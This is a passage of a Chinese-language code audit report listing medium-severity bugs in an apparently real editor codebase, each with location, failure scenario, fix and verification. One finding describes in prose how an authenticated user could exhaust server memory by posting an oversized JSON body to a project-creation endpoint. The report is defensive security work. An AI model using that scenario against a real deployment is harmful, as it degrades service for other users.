medium:影响范围仅限于请求者自己新建的项目(导入会创建一个由调用者拥有的新项目),需要手工构造第一方客户端不会生成的载荷(apps/web/src/editor/editorApi.ts:462 编码的是归一化后的 workspace),settings 提交路径不受影响,而且 DELETE /projects/:id(project/routes.go:26)允许用户丢弃并重新导入,不会造成实质数据损失。这是一个真实的导入/提交校验一致性漏洞,而非不可恢复的数据损坏。

##### M-SI-03 publishTrace 在保留淘汰后使会话 snapshot 上的 consoleObservations 数组保持陈旧

- **位置**: [`packages/runtime-core/src/executionSession.ts:585`](packages/runtime-core/src/executionSession.ts#L585)
- **类别**: state-integrity ｜ **严重度**: Medium ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `pkg-runtime-core`

**详情**: `retain()` 会基于刚刚裁剪过的 `session.retained` 环形缓冲重新计算全部三个投影(`events`、`observations`、`consoleObservations`)。协调器中其他每一处 snapshot 写入都会同时赋值这三个(`activate` 中第 427 行、job 事件订阅者中第 462 行、`publishConsole` 中第 658 行、`clearEvents` 中第 677 行)。而 `publishTrace` 只赋值 `events` 和 `observations`,因此 `session.snapshot.consoleObservations` 会保留它此前持有的那个冻结数组 —— 其中包含 `retain()` 刚刚从 `session.retained` 中淘汰掉的 console 观测记录。此时 snapshot 与协调器自身的保留状态互相矛盾,而 `createExecutionConsoleSnapshot`(executionConsole.ts:739)直接读取 `input.session.consoleObservations`。

**失败场景**: 协调器以默认的 `maxEvents: 500` 创建。某个 job 发布了 500 条 console 观测记录(retained 已满,snapshot.consoleObservations 有 500 条)。随后发布一条 trace:`retain()` 追加该 trace 记录并切片,淘汰掉第 1 条 console 观测;`projected.consoleObservations` 此时只有 499 条,但第 585 行的赋值并未使用它。`getSnapshot()` 返回 `revision+1`,却仍带着旧的 500 条 `consoleObservations`,于是 `createExecutionConsoleSnapshot` 仍会渲染协调器认为已被丢弃的第 1 条 console 观测。若继续发布 trace,偏差会不断扩大:snapshot 可能报告 `retained` 中已不存在的 console 记录,而且 `publishConsole` 会把这些相同的 observationId 报告为 `published`(而非 `duplicate`),因为它的重复扫描是针对 `session.retained` 而非 snapshot 执行的。

**修复建议**: 在 `publishTrace` 的 snapshot 更新中补上 `consoleObservations: projected.consoleObservations,`,与其他四处写入点保持一致。

**验证备注**: 已在源码中核实。retain()(executionSession.ts:373-381)追加记录、按 maxEvents 切片,并返回 projectRetained(),后者重新计算 events/observations/consoleObservations(255-274)。publishTrace 在 585-594 处只赋值 events 和 observations,与引用完全一致;其他每一处 snapshot 写入都赋值三者(activate 425-427、job 事件订阅者 460-462、publishConsole 656-658、clearEvents 675-677)。因此当一次 trace 发布把某条 console 观测从共享环形缓冲中淘汰后,session.snapshot.consoleObservations 仍保留着被淘汰的条目,而 createExecutionConsoleSnapshot 直接读取 input.session.consoleObservations(executionConsole.ts:739)。生产可达:apps/web/src/editor/features/execution/executionSessionEnvironment.ts 以 maxEvents: 500 创建协调器,blueprintProjectRunnerClient.ts 同时调用 publishTrace(79/82/85)和 publishConsole(144)。严重性由 high 下调:这只是可丢弃的运行时读投影状态出现分歧(不涉及 Workspace/PIR 持久化,不涉及机密泄露),受 maxEvents 限制,并且在下一次 publishConsole 或 job 事件时自愈,因为两者都会重新赋值三个投影。实际后果至多是 UI 中出现少量陈旧的 Console 行。

##### M-SI-04 Code Authoring 保存可能让 savingArtifactId 永久保持设置状态,在整个会话中彻底阻塞保存

- **位置**: [`apps/web/src/editor/features/code/useCodeAuthoringSession.ts:253`](apps/web/src/editor/features/code/useCodeAuthoringSession.ts#L253)
- **类别**: state-integrity ｜ **严重度**: Medium ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `xcut-architecture`

**详情**: `save()` 通过 `beginCodeAuthoringSessionSave(current, artifactId)` 用一个显式的 artifact id 设置 `savingArtifactId`,但两条失败路径都通过 `reportError(message)` 来清除它,而后者调用 `setCodeAuthoringSessionError(current, message)` 时 artifact id 默认取 `session.activeArtifactId`(packages/authoring/src/codeAuthoring.ts:376)。该辅助函数只在 `artifactId === session.savingArtifactId` 时才清除 `savingArtifactId`(第 380-383 行)。如果提交在飞行途中活动 artifact 发生了变化,两个 id 就不再匹配,`savingArtifactId` 便永远不会被释放。`codeAuthoring.ts` 中没有其他地方会清除它 —— `reconcileCodeAuthoringSessionArtifact`、`updateCodeAuthoringSessionDraft` 和 `discardCodeAuthoringSessionDraft` 都不会碰它。

**失败场景**: 用户编辑代码文件 A 并点击保存。`dispatchWorkspaceAuthoringOperation` 会 await 一次 IndexedDB 入队加一次网络提交。在其挂起期间,用户在 Code Resources 树中点击了文件 B,于是 `reconcileCodeAuthoringSessionArtifact` 把 `activeArtifactId` 设为 'B'。随后提交返回 `{status:'rejected'}`(例如只读 workspace、revision 冲突或离线)。`reportError` 以 artifactId 'B' 被调用,而它 !== savingArtifactId 'A',因此 `savingArtifactId` 仍然是 'A'。从此 `isSaving` 永久为 true,之后每一次 `save()` 都会在第 160-162 行返回 `{status:'unavailable', reason:'session-busy'}`,而 `beginCodeAuthoringSessionSave` 同样受 `!session.savingArtifactId || session.savingArtifactId === artifactId` 的限制。用户在导航离开并重新挂载 Code 页面之前无法保存任何代码文档,期间后续编辑会被静默丢失。

**修复建议**: 在两条失败路径上都显式传入正在保存的 artifact id,例如把 `reportError` 改为接受一个 artifactId,并用 `save()` 开头捕获的 `artifactId` 调用 `setCodeAuthoringSessionError(current, message, artifactId)`;或者在 `@prodivix/authoring` 中新增一个显式的 `failCodeAuthoringSessionSave(session, artifactId, message)`,并在 rejected 分支和 catch 分支中都调用它。

**验证备注**: 已端到端验证。useCodeAuthoringSession.ts:243-245 用显式捕获的 artifactId 开始保存(beginCodeAuthoringSessionSave(current, artifactId)),而两条失败路径(第 253 行和第 270-276 行的 catch)都调用 reportError(message),reportError(第 129-136 行)调用 setCodeAuthoringSessionError(current, message) 时不传 artifactId,于是 packages/authoring/src/codeAuthoring.ts:373-378 把它默认为 session.activeArtifactId,并且只在 `message && artifactId === session.savingArtifactId` 时才清除 savingArtifactId。我确认没有其他辅助函数会释放它:reconcileCodeAuthoringSessionArtifact(codeAuthoring.ts:222-290)、updateCodeAuthoringSessionDraft 和 discardCodeAuthoringSessionDraft 都不触碰 savingArtifactId;completeCodeAuthoringSessionSave 只在成功时正确清除它。可达性成立:会话在 artifact 切换后仍然存续,因为 synchronizeCodeAuthoringSessionRequest 只在 requestId 变化时才重建会话(codeAuthoring.ts:184-193),而 CodeAuthoringWorkspace.tsx:348-352 传入的是一个稳定的 `request`,其中只有 artifactId={selectedFile?.id} 在变化;资源树的 onSelect(CodeAuthoringWorkspace.tsx:1646-1647)并不受 isSaving 限制(且第 987/1012/1116 行的 effect 也能自行改变选择),因此选择确实可能在被 await 的 dispatchWorkspaceAuthoringOperation 期间发生变化。一旦卡死,save() 会对任何 artifact 都在第 160-162 行返回 'session-busy',唯一的恢复方式是卸载 Code 表面(这同时也会丢弃草稿)。后果是保存被阻塞并可能丢失未保存的编辑,而非 canonical 数据损坏 —— medium 是合适的严重性。

#### 4.3.5 资源泄漏(resource-leak)

##### M-RL-01 已认证的 JSON 端点接受无界请求体;项目创建过程通过 PIR 校验与归一化把它放大约 20 倍

- **位置**: [`apps/backend/internal/modules/project/handlers.go:69`](apps/backend/internal/modules/project/handlers.go#L69)
- **类别**: resource-leak ｜ **严重度**: Medium ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `be-auth-project-env`

**详情**: `apps/backend/server.go:50` 中的 `gin.Default()` 没有安装任何请求体大小中间件,`RegisterAPIRoutes` 也没有添加。其他每个模块都用 `http.MaxBytesReader` 包裹 `c.Request.Body`(auth register/login 64 KiB、environment 512 KiB、github、workspace commit、workspace asset import、remote execution),但有三个已认证处理器没有:`HandleCreateProject`(第 69 行)、`HandleUpdateProject`(第 141 行)和 `auth.HandleUpdateMe`(apps/backend/internal/modules/auth/handlers.go:204)。`HandleCreateProject` 最严重,因为 `request.PIR` 是一个 `json.RawMessage`,`normalizePIR` 随后又会把它展开三次:`pircontract.ValidateDocument` 构建完整的 jsonschema 值树,`json.Unmarshal` 构建一个 `map[string]any`,`json.Marshal` 再重新序列化——这些都没有大小上限。

**失败场景**: 任何已认证用户向 `/api/projects` POST 形如 `{"name":"x","pir":{ <200 MB 的合法 PIR-current JSON> }}` 的请求体。`c.ShouldBindJSON` 会实体化这 200 MB 的原始消息,`pircontract.ValidateDocument` 由此构建一棵解码后的值树,`json.Unmarshal` 构建第二棵 `map[string]any` 树,`json.Marshal` 又分配第三份拷贝——单个请求就产生数 GB 的活跃堆内存,并且可以并发重复发起,导致进程被杀(OOM)。同一用户还可以向 `/api/users/me` PATCH 一个数 GB 的 `name` 字符串,该字符串既会被缓冲,又会被写入 `users.name` TEXT 列。

**修复建议**: 在 `HandleCreateProject`、`HandleUpdateProject` 和 `auth.HandleUpdateMe` 中应用 `c.Request.Body = http.MaxBytesReader(c.Writer, c.Request.Body, <limit>)`(与现有的各模块常量保持一致),并在持久化之前对 `name`/`description` 增加明确的长度上限。

**验证备注**: 已核实 server.go:50 使用 gin.Default()(仅 Logger+Recovery)加上 SetTrustedProxies 和 CORS 中间件;internal/app/routes.go:26 的 RegisterAPIRoutes 没有添加任何请求体大小中间件,而 Go 的 net/http 也不施加默认请求体上限。对 MaxBytesReader/LimitReader 的 grep 确认 auth register/login(handlers.go:83,126)、avatar(226)、environment(handler.go:54)、github(56,87)、workspace commit/settings/asset、remote execution 以及 workspace-execution-role 都对请求体设了上限,而 project/handlers.go:69(create)、:141(update)和 auth/handlers.go:204(HandleUpdateMe)没有。放大效应是真实的:request.PIR 是 json.RawMessage,pircontract.ValidateDocument(contract.go:41)通过 jsonschema.UnmarshalJSON 构建完整的 json.Number 值树,随后 normalizePIR 构建 map[string]any 并重新序列化。UserStore.Update(auth/store.go:95-104)只对 name 做 TrimSpace,没有任何长度上限就写入 users.name。严重级别从 high 下调,因为这三条路由都位于 RequireAuth 之后(project/routes.go:22,24),所以这是已认证用户的资源耗尽缺口,而非未认证 DoS;标题中的 ~20 倍这一数字比较随意,但多份拷贝的机制成立。

##### M-RL-02 ExecutionJob 的事件历史在 job 的整个生命周期内无界增长

- **位置**: [`packages/runtime-core/src/executionJob.ts:247`](packages/runtime-core/src/executionJob.ts#L247)
- **类别**: resource-leak ｜ **严重度**: Medium ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `pkg-runtime-core`

**详情**: `commitEvent` 把每一个发出的事件推入模块级的 `history` 数组(第 208 行声明),而没有任何地方对其做裁剪。`history` 只被 `subscribe` 读取用于重放。本包中其他每一处保留面都有明确的预算(`EXECUTION_CONSOLE_LIMITS.maximumRecords`、`EXECUTION_TERMINAL_LIMITS.maximumOutputRecords`、`createExecutionSessionCoordinator` 的 `maxEvents`、`EXECUTION_TEST_REPORT_LIMITS`),因此此处缺少上界是一处遗漏而非设计选择。每条被保留的日志事件可携带最多 64 KiB 的消息(`createExecutionLogRecord` 仅以 `utf8ToBytes(input.message).byteLength > 64 * 1024` 作为唯一上限),外加最多 64 个克隆的参数值,全部被该数组强引用持有。

**失败场景**: 由 `browserProjectRunner` 创建的 `preview` job(packages/runtime-browser/src/browserProjectRunner.ts:134 对每一行 dev-server 输出调用 `controller.emitLog`)在编辑器标签页中运行数小时。会话协调器把自身视图限制在 500 条记录,但 job 控制器的 `history` 会永久累积每一行对应的一个冻结 `ExecutionJobLogEvent`。在约 10 万行嘈杂输出之后,浏览器标签页持有数百 MB 任何消费方都无法访问的日志事件,而且每次新的 `job.subscribe(...)` 还会对整个数组执行一次 `history.filter(...)`。`remoteExecutionProvider.ts:335` 走的是同一条路径,它把每一个远端日志事件都通过 `controller.emitLog` 转发。

**修复建议**: 在 `CreateExecutionJobControllerInput` 中增加 `maxRetainedEvents` 预算(默认取一个与其他 EXECUTION_* 限制并列的固定常量),并在 `commitEvent` 中裁剪 `history`;同时记录最早保留的 sequence,使 `subscribe({ afterSequence })` 能够报告重放缺口,而不是静默返回不完整的历史。

**验证备注**: 已核实:对 packages/runtime-core/src/executionJob.ts 中的 'history' 执行 git grep 恰好返回三处命中 —— 第 208 行声明、第 247 行 commitEvent 中的 history.push(event),以及第 430 行 subscribe 中的 history.filter(...)。任何地方都没有裁剪、切片或预算,引用的证据吻合。对于非终态 job,其生命周期内的增长确实是无界的:publishEvent 只在终态状态之后才拒绝(320-322),而 packages/runtime-browser/src/browserProjectRunner.ts 会让 preview job 保持 'running'(publishPreview 内部第 262 行的 markRunning),同时 runtimeHost.subscribe 对每一行 dev-server 输出转发一次 emitLog(154-156,仅由 isJobActive 守卫)。packages/runtime-remote/src/remoteExecutionProvider.ts:334 同样把每个远端 'log' 事件通过 controller.emitLog 转发。64 KiB 的消息大小上限在 executionConsole.ts:266 的 createExecutionLogRecord 中得到确认,executionJob.ts:452 应用了它。该条目中 remoteExecutionProvider 的文件路径写错了(应为 runtime-remote 而非 runtime-browser),但那只是一处佐证引用,不是问题本身的位置。严重性 medium 成立:这是长期存活的浏览器路径上一处真实的无界内存缓冲,会劣化会话而不会损坏数据,并在 job/会话被释放时随之释放。

##### M-RL-03 IndexedDB 审计存储永久缓存其数据库 promise,一次关闭/失败就让所有 required-before-effect 的 Gateway 方法永久失败关闭

- **位置**: [`packages/plugin-browser/src/gateway/audit/indexedDbGatewayAuditStore.ts:56`](packages/plugin-browser/src/gateway/audit/indexedDbGatewayAuditStore.ts#L56)
- **类别**: resource-leak ｜ **严重度**: Medium ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `pkg-plugin-host`

**详情**: `openDatabase()` 用 `??=` 记忆化 `databasePromise`,且从不使其失效。两种可达事件会永久性地污染它:(a) 该 promise 被拒绝(`request.onerror` / `request.onblocked`),而被拒绝的 promise 被缓存下来;(b) `database.onversionchange = () => database.close()` 关闭了句柄,但已 resolve 的 promise 仍把这个已关闭的 `IDBDatabase` 交给之后的每一次 `append()`,而其中 `database.transaction(...)` 会抛出 `InvalidStateError`。由于 `createGatewaySessionAuditWriter` 会把 `required-before-effect` 契约在 preflight 阶段的任何 append 失败映射为 `GATEWAY_AUDIT_UNAVAILABLE`,而 `createBrowserGatewaySessionFactory` 在 `contract.execute` 之前就把它作为硬失败返回,整个 Gateway 表面就此劣化且没有恢复路径。

**失败场景**: 编辑器已打开且插件运行时处于活跃状态。用户清除站点数据(或另一个标签页触发数据库版本变更),这会触发 `versionchange` 与 `database.close()`。`databasePromise` 仍解析为那个已关闭的句柄。此后来自插件的每一次 `workspace/dispatch-intent`、`document/read`、`document/apply-patch` 和 `network/request` 都会在整个浏览器会话期间以 PLG GATEWAY_AUDIT_UNAVAILABLE 失败,即便 IndexedDB 完全可用 —— 只有整页刷新才能恢复。

**修复建议**: 在打开被拒绝时,以及在 `onversionchange`/`onclose` 内部清除 `databasePromise`(例如 `databasePromise = undefined; database.close();`),使下一次 `openDatabase()` 重新打开;并在 `append` 中遇到 `InvalidStateError` 时重试一次。

**验证备注**: 证据与 indexedDbGatewayAuditStore.ts:51-78 完全吻合。`databasePromise ??= new Promise(...)` 在 promise 仍处于 pending 状态时就同步赋值,因此之后来自 `request.onerror`/`request.onblocked` 的拒绝会被永久缓存;任何地方都不会使其失效(第 165 行的 `dispose()` 只是把 `disposed` 置为 true 并关闭句柄 —— 它从不清除 `databasePromise`,也不存在 `onclose`/错误恢复重置)。第 69 行的 `onversionchange -> database.close()` 处理器使已 resolve 的 promise 继续把一个已关闭的 IDBDatabase 交给第 87 行的 `append()`,其中 `database.transaction(...)` 在一个 async 函数内抛出 InvalidStateError,即一次被拒绝的 append。审查者描述的下游链路是真实的:gatewaySessionAuditWriter.ts:143-168 把 phase 为 'preflight'、auditMode 为 'required-before-effect' 时的任何 append 拒绝映射为 GATEWAY_AUDIT_UNAVAILABLE,而 createBrowserGatewaySessionFactory.ts:295-300 在 `contract.execute` 之前返回 `pluginHostFailure([preflightDiagnostic])`。builtInGatewayContracts.ts 确认 workspace/read-summary、workspace/dispatch-intent、document/read、document/apply-patch 和 network/request 全部是 'required-before-effect'(只有 runtime.health/ping 和 telemetry/emit 是 best-effort),因此这些方法确实都会失败关闭。严重性由 high 降为 medium:该失败是失败关闭的(无数据丢失/损坏,无机密泄露),可通过整页刷新恢复,需要不常见的触发条件(deleteDatabase/清除站点数据/打开失败),而且 Gateway 调度路径目前从编辑器 UI 无法到达 —— apps/web 的 WebPluginPlatform(apps/web/src/plugins/platform/types.ts:279-288、createWebPluginPlatform.ts:415-442)未暴露 `activate`,因此 `host.activate`(通往浏览器 gateway 会话的唯一途径)只会被 plugin-host 测试与一致性测试工具调用。

##### M-RL-04 mkdtemp() 失败时 YARA-X 扫描器的并发槽位被泄漏,在 readiness 缓存窗口内使整个资产投递扫描门禁瘫痪

- **位置**: [`apps/asset-delivery-host/src/yaraXScannerRuntime.ts:233`](apps/asset-delivery-host/src/yaraXScannerRuntime.ts#L233)
- **类别**: resource-leak ｜ **严重度**: Medium ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `app-runner-cp-hosts`

**详情**: `activeScans` 在第 233 行递增,但递减它的 `try`/`finally` 直到第 235 行才开启 —— 也就是在 `await mkdtemp(...)` _之后_。`mkdtemp` 的任何拒绝(ENOSPC、EACCES、EMFILE、TMPDIR 被删除或重新挂载)都会从 `scan()` 中逃逸,并让计数器在该扫描器实例的整个生命周期内永久保持为已递增状态。该扫描器实例被捕获在已发布的 snapshot 中,并在下一次*成功*的 `refresh()` 之前被每个请求复用,而 `refresh()` 只有在 `cacheExpiresAt` 过去之后才会运行(`readinessCacheMs`,`main.ts` 中默认 30s,最长可配置到 10 分钟)。`sharpRasterTransformer.ts:177` 中的同类实现做对了(先递增,再 `try`),说明这种不对称是笔误而非设计选择。

**失败场景**: Asset Delivery Host 以默认的 `ASSET_DELIVERY_YARAX_MAXIMUM_CONCURRENT=4` 和 `ASSET_DELIVERY_YARAX_READINESS_CACHE_SECONDS=30` 运行。容器的 /tmp 被写满(或触及 inode 上限),此时有四个资产上传请求到达;每个 `mkdtemp` 都被拒绝,每个请求泄漏一个槽位,于是 `activeScans` 达到 4。一秒后 /tmp 又被释放。但此后每一个 `POST /internal/delivery-sessions`、`POST /internal/image-transform-delivery-sessions` 和 `GET /readyz` 都会走进第 225 行的 `activeScans >= maximumConcurrentScans` 分支并抛出 `BinaryAssetScannerUnavailableError('replicas-exhausted')` → HTTP 503 `scanner-unavailable`,尽管实际上没有任何扫描在运行,直到 readiness 缓存过期、一次 refresh 重新发布出新的扫描器为止。当 `readinessCacheMs` 被设置到接近 600000 ms 上限时,每次这样的突发会造成长达十分钟的中断。

**修复建议**: 把递增放进受保护区域内,例如 `activeScans += 1; try { const directory = await mkdtemp(...); try { ... } finally { await rm(directory, {force:true, recursive:true}); } } finally { activeScans -= 1; }`,这样无论失败发生在何处计数器都一定会被释放。

**验证备注**: 已验证 yaraXScannerRuntime.ts:233-235:`activeScans += 1` 位于 `await mkdtemp(...)` 之前,递减它的 `try`/`finally` 在其之后才开启,因此 mkdtemp 的任何拒绝都会逃逸并让计数器永久保持递增。sharpRasterTransformer.ts:176-178 的同类实现确实是先递增再 `try`,所以这种不对称是真实存在的。该扫描器实例被捕获在 `current.snapshot`(第 484 行)中,并在 `at < cacheExpiresAt` 期间被 `acquire()` 复用,因此泄漏会持续整个 readiness 缓存窗口(main.ts:111-112,默认 30s,上限 600s)。没有任何测试覆盖它。但失败场景被夸大了:`/readyz`(assetDeliveryHttpHandler.ts:359-361)只调用 `acquireScannerSnapshot()` -> `runtime.acquire()`,它返回缓存的 snapshot 而不会调用 `scan()`,因此 readiness 仍返回 200。只有 POST 扫描路径会命中 `activeScans >= maximumConcurrentScans` 分支。它还能自愈:下一次 `refresh()` 会构建一个全新的、`activeScans = 0` 的扫描器闭包,其干净探测会成功。净效果是一种失败关闭、自限性的可用性降级,只会延长一次本就由 tmpdir 故障引起的中断 —— 没有安全绕过,也没有数据损坏。严重性由 high 修正为 medium。

#### 4.3.6 架构不变量(architecture-invariant)

##### M-ARCH-01 富文本/纯文本切换把仅属于编辑器的 UI 偏好持久化进规范 PIR 元素 props,并泄漏到 DOM 和导出源码中

- **位置**: [`apps/web/src/editor/features/blueprint/editor/model/blueprintText.ts:110`](apps/web/src/editor/features/blueprint/editor/model/blueprintText.ts#L110)
- **类别**: architecture-invariant ｜ **严重度**: Medium ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `web-blueprint`

**详情**: `updateNodeTextFieldMode` 把 `props.textMode = { text: 'rich' }` 写入 inspector 的节点视图。`toElementNode` 会把每个视图 prop 转换成字面量 `PIRValueBinding`(bindingProjection.ts:282),因此该事务会把 `textMode` 作为真实的 PIR 元素 prop 持久化到 Canonical Workspace 中。`blueprintText.ts` 之外没有任何代码读取它:`git grep textMode` 只能找到该文件,以及编译器中与之无关的 `AdapterResolution.textMode` 字段。与此同时,`PIRElementProjection` 会把所有解析出的 props 展开到宿主组件上(`const props = { ...(projected.props ?? resolvedProps) }`,PIRElementProjection.tsx:117-119),而 `codegenPolicy.applyPropsTransform` 除非有策略显式忽略,否则会把未知 props 原样传递到生成的代码中。这属于把编辑器视图状态当作领域数据来存储,而架构规定这类内容应放在 UI 偏好存储中,而不是 Workspace 里。

**失败场景**: 作者选中一个 `span` 节点并点击 "Switch to rich text editor"。提交后的 PIR 元素变成 `{type:'span', props:{ text:…, textMode:{kind:'literal',value:{text:'rich'}} }}`。在画布上,React 在内置元素上收到一个取值为对象的未知属性,渲染出 `textmode="[object Object]"`(React 18 还会额外打印一条未知 prop 警告)。导出项目时会把 `<span textMode={{"text":"rich"}}>` 写入生成的生产源码,并且该 prop 会随节点一起经过组件提取、复制和 Git projection 传播。

**修复建议**: 把纯文本/富文本的选择保留在编辑器本地状态中(例如在 Blueprint UI store 中以 document+node 为键的 `Record<nodeId, TextFieldMode>`),而不是放进节点 props;或者 —— 如果它必须在重新加载后依然保留 —— 把它放到渲染器与编译器都会显式忽略的、由领域拥有的编辑器元数据通道中。同时在读取时剥离任何已经持久化的 `textMode` prop,让现有文档不再输出它。

**验证备注**: 链条上的每一环都成立。blueprintText.ts:110-120 与引用原样一致,并且可从生产 UI 到达(InspectorNodeIdentityFields.tsx:186-190 与 235-239 调用 updateSelectedNode(current => updateNodeTextFieldMode(...))),该路径经由 applySelectedNodeUpdate -> toElementNode -> toBindingRecord(bindingProjection.ts:145-149),其第二个循环会把任何新的视图 prop 作为 {kind:'literal', value} 添加进去。因此 props.textMode = {text:'rich'} 确实通过一次真实的 Workspace Transaction 被持久化进了规范 PIR 元素。没有任何消费方:在 blueprint 目录之外对 packages/ 和 apps/ 执行 git grep textMode,只命中 packages/prodivix-compiler/src/core/adapter.ts:30 和 codegenPolicy.ts,那里的 textMode 是无关的 'preserve'|'omit' 适配器字段。PIRElementProjection.tsx:121-123 把所有解析出的 props 无允许列表过滤地展开到宿主组件上,而 codegenPolicy.applyPropsTransform(第 150-165 行)除非有规则显式忽略该键,否则原样返回 {...node.props},因此它也会进入生成源码。这确实违反了'编辑器视图状态不得成为领域数据'这一不变式。严重度由 high 下调:载荷只是一个惰性的装饰性 prop —— 没有数据丢失、没有安全暴露、也没有破坏其他领域状态;影响范围仅限于一个多余的 DOM 属性,外加生成输出中的一个多余 prop。

##### M-ARCH-02 AntdTour 被声明为 host-overlay,但其 portal 从未绑定到 Host overlay 容器

- **位置**: [`packages/plugin-antd/src/surfaceProvider.tsx:182`](packages/plugin-antd/src/surfaceProvider.tsx#L182)
- **类别**: architecture-invariant ｜ **严重度**: Medium ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `pkg-plugin-official-ui`

**详情**: 生成器把 `'Tour'` 放进了 `overlayPaths`(`scripts/generate-plugin-resources.mjs:217`),因此产出的 render policy 给 `AntdTour` 赋予了 `portal: { mode: 'host-overlay', canvasOpen: { prop: 'open', value: true, when: 'selected' } }` 和 `hostImplementationId: 'antd.render.overlay'`。但 `createAntdWrapper(component, overlay)` 只为 `Modal` 和 `Drawer` 重新绑定容器。该集合中其余所有 overlay 都依赖 `ConfigProvider.getPopupContainer`,而 antd 的 `Tour` 恰恰是该集合中唯一不从 `ConfigContext` 读取 `getPopupContainer` 的组件(已验证:`antd/es/tooltip/index.js`、`select/index.js` 和 `modal/Modal.js` 都从 `ConfigContext` 解构出 `getPopupContainer: getContextPopupContainer`;而 `antd/es/tour/index.js` 中不存在任何此类引用)。`@rc-component/tour` 通过不带 `getContainer` 的 `<Portal open autoLock>` 渲染它的 `Mask` 和目标占位元素,因此它们会挂载到 `document.body`。`paletteProjection.tsx:81` 处的 palette 代码试图为 Tour 传入 `getContainer`,但 `getContainer` 根本不是 Tour/rc-tour 的 prop(rc-tour 只接受 `getPopupContainer`),所以这一尝试同样无效。

**失败场景**: 一个 PIR 节点 `{ type: 'AntdTour', props: { steps: [{ title: 'Step 1' }] } }`(由导入、代码生成或 AI 产生 —— `steps` 的 `valueType: 'array'`,因此不可在 Inspector 中编辑)在 Blueprint 画布上被选中。`renderPolicyResolver.applyProps` 强制 `open: true`,由于 `steps.length > 0`,`mergedOpen` 变为 true,rc-tour 于是把一个 `position: fixed` 的全视口遮罩以及目标占位元素直接挂载到 `document.body`,并带 `autoLock: true`。该遮罩会覆盖画布表面之外的整个编辑器外壳,同时 body 滚动被锁定,而这正是 `host-overlay` / `owner-scoped` 表面契约要防止的情况。

**修复建议**: 要么在 `createAntdWrapper` 中显式绑定 Tour(传入 `getPopupContainer: () => overlayContainer`,并在不存在 overlay 容器时失败关闭,与 Modal/Drawer 分支保持一致),并接受 rc-tour 的 Mask 仍会逃逸;要么 —— 鉴于 rc-tour 的 Mask/占位 Portal 根本不接受任何容器 —— 把 `'Tour'` 从 `overlayPaths` 中移除并标记为不支持(`portal: { mode: 'disabled' }`),使其不会在画布上被强制打开。同时移除 `paletteProjection.tsx:81` 中对 Tour 无效的 `props.getContainer` 赋值。

**验证备注**: 链路上的每一环都已验证。generate-plugin-resources.mjs:217 确实在 overlayPaths 中包含 'Tour'(精确行)。render-policy.json rules[65] 产出 {runtimeType:'AntdTour', hostImplementationId:'antd.render.overlay', portal:{mode:'host-overlay', canvasOpen:{prop:'open',value:true,when:'selected'}}}。hostModule.tsx:54-57 把 'antd.render.overlay' 映射到 wrapAntdOverlayComponent,即 createAntdWrapper(component, true)(surfaceProvider.tsx:212),而 surfaceProvider.tsx:180-192 处的容器重绑定以 `component === Modal || component === Drawer` 为条件 —— Tour 两者都不是。surfaceProvider.tsx:110-121 处的 ConfigProvider 回退提供了 getPopupContainer,但我读了已安装的 antd 源码:packages/plugin-antd/node_modules/antd/es/tour/index.js:33-37 只从 ConfigContext 解构 {getPrefixCls, direction, tour} —— 没有 getPopupContainer —— 证实 Tour 是 overlayPaths 中唯一忽略它的组件。我还读了 @rc-component/tour 1.15.1:Mask.js:35-37 渲染不带 getContainer 的 `<Portal open autoLock>`,Tour.js:197-199 通过另一个不带 getContainer 的 `<Portal open autoLock>` 渲染目标占位元素,两者都是 position:fixed 全视口 —— 因此无论如何都会挂载到 document.body。paletteProjection.tsx:78-82 确实为 Tour 设置了 `props.getContainer`,而它确实无效(antd Tour 通过 restProps 把它转发给 rc-trigger,后者接受的是 getPopupContainer;那两个 body Portal 虽然接受 getContainer,但 rc-tour 从不传入)。renderPolicyResolver.ts:52-61 确认在设计模式下被选中时会强制 open:true。原始判断中有一处事实错误,但并不推翻结论:componentCatalog.generated.ts:2462-2467 声明 `steps` 的 valueType 为 'string' 而非 'array',defaultProps 为 `{open:false, steps:[]}` —— 非空的 steps 值会让 rc-tour 的 postState(Tour.js:69-71:`mergedCurrent >= steps.length ? false : origin ?? true`)解析为打开,因此这个陷阱如果说有差别的话,反而比声称的更容易触发。严重性定为 medium 是站得住脚的:这是画布/编辑器外壳的隔离逃逸(所声明的 host-overlay 契约未被遵守),而非数据损坏,且需要一个非空的 steps 值,默认从 palette 拖入不会产生这种值。

#### 4.3.7 状态完整性(state-data-integrity)

##### M-SI-05 三方合并会静默丢弃 stable-id 实体数组的重排序(更新丢失,且不产生冲突)

- **位置**: [`packages/workspace-sync/src/workspaceThreeWay.ts:251`](packages/workspace-sync/src/workspaceThreeWay.ts#L251)
- **类别**: state-data-integrity ｜ **严重度**: Medium ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `pkg-workspace-sync-router`

**详情**: `statesEqual`(workspaceThreeWay.ts:116)委托给 `semanticJsonValuesEqual`,其 stable-id 数组分支(jsonValue.ts:113-131)把两个数组作为 ID _映射_ 来比较,完全忽略元素顺序。任何最后一个 pointer 段落在 `STABLE_ID_ARRAY_FIELDS` 中的字段(`primitives`、`tracks`、`keyframes`、`nodes`、`edges`、`timelines`、`bindings`、`groups`、`svgFilters`、`graphs` —— jsonValue.ts:45-56)在纯重排序之后都会比较为相等。于是在 `mergeValueStates` 中,第 251 行(`if (statesEqual(local, base, path)) return cloneJsonValue(remote);`)得出「本地没有变化」的结论并整体返回 remote 数组,本地顺序因此被丢弃,也不会推入任何 `WorkspaceMergeConflict`。对称的第 252 行以同样方式丢弃 remote 的重排序。由于没有记录冲突,`autoRebaseWorkspaceSnapshots`(workspaceThreeWay.ts:783)报告 `ok: true, status: 'rebased'`,调用方随即把合并后的 snapshot 采纳为新的本地状态。这条路径是活跃的:`apps/web/src/editor/workspaceSync/workspaceRemoteSnapshotAdoption.ts:17` 和 `workspaceRevisionRecovery.ts:66` 都会在远端 snapshot 采纳过程中调用它。至少对 `primitives` 而言顺序在语义上是承载信息的——`packages/animation/src/animationEvaluation.ts:291` 按数组顺序把 `filter.primitives` 映射进发出的 SVG filter 链,而其中文档顺序定义了管线。

